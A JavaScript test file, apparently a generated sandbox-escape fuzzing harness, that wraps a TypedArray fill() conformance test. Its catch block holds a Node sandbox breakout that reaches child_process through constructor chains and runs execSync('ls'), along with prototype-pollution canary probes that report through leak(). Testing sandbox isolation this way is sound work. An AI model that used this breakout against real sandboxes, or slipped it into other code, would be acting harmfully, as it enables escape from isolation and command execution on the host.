try {
    testWithTypedArrayConstructors(function (TA) {
        assert(compareArray(new TA([
            0,
            0,
            0
        ]).fill(8, 1), [
            0,
            8,
            8
        ]), 'Fill elements from custom start position');
        assert(compareArray(new TA([
            0,
            0,
            0
        ]).fill(8, 4), [
            0,
            0,
            0
        ]), 'start position is never higher than length');
        assert(compareArray(new TA([
            0,
            0,
            0
        ]).fill(8, -1), [
            0,
            0,
            8
        ]), 'start < 0 sets initial position to max((len + relativeStart), 0)');
        assert(compareArray(new TA([
            0,
            0,
            0
        ]).fill(8, -5), [
            8,
            8,
            8
        ]), 'start position is 0 when (len + relativeStart) < 0');
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}